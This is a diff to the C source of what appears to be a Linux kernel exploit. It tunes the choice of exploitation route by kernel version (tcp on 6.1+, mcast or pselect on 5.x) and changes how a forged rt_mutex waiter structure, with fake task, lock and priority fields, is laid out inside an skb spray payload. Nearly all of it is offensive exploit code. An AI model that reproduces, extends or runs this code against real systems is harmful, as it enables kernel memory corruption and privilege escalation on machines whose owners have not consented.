@@ -56,7 +56,12 @@ int tcp_route_selected(void) {
   if (s && *s && strcmp(s, "0") == 0) {
     return 0;
   }
-  return active_offsets && active_offsets->compact_waiter;
+  /* tcp's zerocopy window ends before the plant on 5.x, so tcp is a 6.1+
+   * transport and 5.10 parks on pselect. 5.15 keeps the tcp cook for the
+   * spray while mcast is the transport. */
+  return active_offsets && active_offsets->compact_waiter &&
+         (kernel5_route_selected() ||
+          strncmp(active_offsets->uname_r, "5.", 2) != 0);
 }
 
 int kernel5_route_selected(void) {
@@ -422,8 +427,12 @@ int prepare_skb_payload(uintptr_t base) {
       }
       put64(p, W0_OFF + 0x30, waiter_task); /* task */
       put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
-      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
-      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+      if (waiter_prio_off() == WAITER_PRIO_OFF) {
+        put32(p, W0_OFF + 0x40, 0);                /* wake_state */
+        put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+      } else {
+        put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO); /* prio */
+      }
       put64(p, W0_OFF + 0x48, 0);           /* deadline */
       put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
     } else {
